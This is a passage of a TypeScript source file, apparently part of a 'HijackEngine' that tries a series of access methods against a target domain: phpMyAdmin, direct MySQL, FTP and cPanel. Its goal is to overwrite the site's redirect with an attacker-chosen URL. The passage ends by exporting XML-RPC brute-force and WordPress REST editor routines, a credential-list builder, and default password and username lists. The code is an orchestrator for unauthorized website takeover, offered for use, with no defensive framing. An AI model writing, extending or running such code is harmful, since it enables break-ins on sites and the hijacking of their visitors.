      name: "phpmyadmin",
      condition: ports.pma || ports.alt8080 || ports.alt8443,
      fn: () => tryPhpMyAdmin(domain, config.newRedirectUrl, onProgress),
    },
    {
      name: "mysql_direct",
      condition: ports.mysql,
      fn: () => tryMysqlDirect(domain, config.newRedirectUrl, onProgress),
    },
    {
      name: "ftp_access",
      condition: ports.ftp,
      fn: () => tryFtpAccess(domain, config.newRedirectUrl, onProgress),
    },
    {
      name: "cpanel_access",
      condition: ports.cpanel || ports.cpanelSsl,
      fn: () => tryCpanelAccess(domain, config.newRedirectUrl, onProgress),
    },
  ];
  
  for (const method of methods) {
    if (!method.condition) {
      methodResults.push({
        method: method.name,
        methodLabel: method.name,
        success: false,
        detail: "Skipped — required port not open",
        durationMs: 0,
      });
      continue;
    }
    
    try {
      const result = await Promise.race([
        method.fn(),
        new Promise<HijackMethodResult>((_, reject) =>
          setTimeout(() => reject(new Error("Method timeout")), methodTimeout)
        ),
      ]);
      
      methodResults.push(result);
      
      if (result.success) {
        winningMethod = result.method;
        console.log(`[HijackEngine] ✅ Method ${result.method} succeeded: ${result.detail}`);
        // Don't break — continue to try other methods for comprehensive results
        // But mark as success
      } else {
        errors.push(`${result.method}: ${result.detail}`);
      }
    } catch (err: any) {
      const timeoutResult: HijackMethodResult = {
        method: method.name,
        methodLabel: method.name,
        success: false,
        detail: `Timeout after ${methodTimeout}ms`,
        durationMs: methodTimeout,
        error: err.message,
      };
      methodResults.push(timeoutResult);
      errors.push(`${method.name}: timeout`);
    }
  }
  
  const totalDuration = Date.now() - start;
  const success = !!winningMethod;
  
  console.log(`[HijackEngine] ${success ? "✅ SUCCESS" : "❌ FAILED"} — ${domain} — ${winningMethod || "no method worked"} — ${totalDuration}ms`);
  
  return {
    success,
    domain,
    newRedirectUrl: config.newRedirectUrl,
    originalRedirectUrl: finalPattern.currentUrl,
    winningMethod,
    methodResults,
    portsOpen: ports,
    redirectPattern: finalPattern,
    totalDurationMs: totalDuration,
    errors,
  };
}

// ═══════════════════════════════════════════════════════
//  EXPORTS FOR TESTING
// ═══════════════════════════════════════════════════════

export {
  tryXmlrpcBrute,
  tryWpRestApiEditor,
  tryPhpMyAdmin,
  tryMysqlDirect,
  tryFtpAccess,
  tryCpanelAccess,
  buildCredentialList,
  checkPort,
  DEFAULT_PASSWORDS,
  COMMON_USERNAMES,
  PMA_PORTS,
  CPANEL_PORTS,
};
